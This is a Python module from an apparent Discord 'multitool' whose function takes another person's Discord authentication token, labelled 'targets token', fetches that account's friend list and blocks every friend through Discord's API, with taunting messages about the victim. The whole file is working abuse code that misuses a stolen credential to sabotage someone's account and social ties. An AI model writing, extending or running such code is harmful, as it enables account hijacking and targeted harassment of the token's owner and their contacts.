# Stellar Multitool is proudly coded by @swedewtf, @rinfys and @crxelty (no longer active)
# Multitool maintained/updated by @swedewtf and @rinfys

from colorama import Fore, Style, init
init(convert=True)
import requests
from util.plugins.pluh import *

red = Fore.RED + Style.BRIGHT
green = Fore.GREEN + Style.BRIGHT
blue = Fore.BLUE + Style.BRIGHT
white = Fore.WHITE

def blocker():
    token = input("Enter targets token: ")
    tokencheck(token)
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
    }
    friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
    if not friendIds:
            print("Woopsies! This kid has no friends :(")
    count = 1
    headers2 = {
        "Authorization": token,
        "Content-Type": "application/json",
    }
    for friend in [friendIds[amount2 : amount2 + 3] for amount2 in range(0, len(friendIds), 3)]:
        for friend in friend:
                try:
                    requests.put(f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'],headers=headers2,json={"type": 2})
                    print(f'{green}Blocked {count} friend(s) ')
                    count += 1
                except Exception as err2:
                        print(f'{red} Oopsie poopsie! An error has occured: {err2}')
    
